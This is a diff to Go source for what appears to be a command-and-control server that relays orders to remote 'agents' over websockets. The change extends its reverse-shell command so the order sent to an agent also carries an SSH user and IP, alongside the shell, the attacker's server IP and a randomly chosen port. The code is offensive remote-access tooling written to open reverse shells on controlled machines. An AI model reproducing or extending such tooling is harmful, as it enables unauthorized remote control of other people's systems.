@@ -168,7 +168,7 @@ func (s *Server) command(b []byte, wsSender *websocket.Conn) {
 			send("Empty parameter !", wsSender)
 		} else {
 			params := s.rsParser(args[1])
-			s.revSh(params[0], params[1], params[2], wsSender)
+			s.revSh(params[0], params[1], params[2], params[3], params[4], wsSender)
 		}
 		break
 	default:
@@ -261,7 +261,7 @@ func (s *Server) id(args string, wsSender *websocket.Conn) {
 }
 
 func (s *Server) rsParser(args string) [5]string {
-	params := strings.SplitN(args, " ", 3)
+	params := strings.SplitN(args, " ", 5)
 	if len(params) < 4 {
 		fmt.Print("empty params")
 		return [5]string{"", "", "*", "", ""}
@@ -275,13 +275,13 @@ func (s *Server) rsParser(args string) [5]string {
 
 }
 
-func (s *Server) rsRequest(agentId string, shell string, rserverIp string, rserverPort string, wsSender *websocket.Conn) {
+func (s *Server) rsRequest(agentId string, shell string, rserverIp string, rserverPort string, userSsh string, ipSsh string, wsSender *websocket.Conn) {
 	id := []string{agentId}
-	msg := "[rs] -> " + shell + " " + rserverIp + " " + rserverPort + " <- " + s.conns[wsSender].id // shell ip port
+	msg := "[rs] -> " + shell + " " + rserverIp + " " + rserverPort + " " + userSsh + " " + ipSsh + " <- " + s.conns[wsSender].id // shell ip port
 	s.direct([]byte(msg), id, wsSender)
 }
 
-func (s *Server) revSh(agentId string, shell string, rserverIp string, wsSender *websocket.Conn) {
+func (s *Server) revSh(agentId string, shell string, rserverIp string, user string, ipSsh string, wsSender *websocket.Conn) {
 	intport := "6655"
 	extport := strconv.Itoa(7700 + rand.Intn(100))
 	fmt.Println(extport, s.usedPort)
@@ -299,7 +299,7 @@ func (s *Server) revSh(agentId string, shell string, rserverIp string, wsSender 
 	}
 	s.usedPort = append(s.usedPort, extport)
 	// send to agent order
-	s.rsRequest(agentId, shell, rserverIp, extport, wsSender)
+	s.rsRequest(agentId, shell, rserverIp, extport, user, ipSsh, wsSender)
 }
 
 func main() {
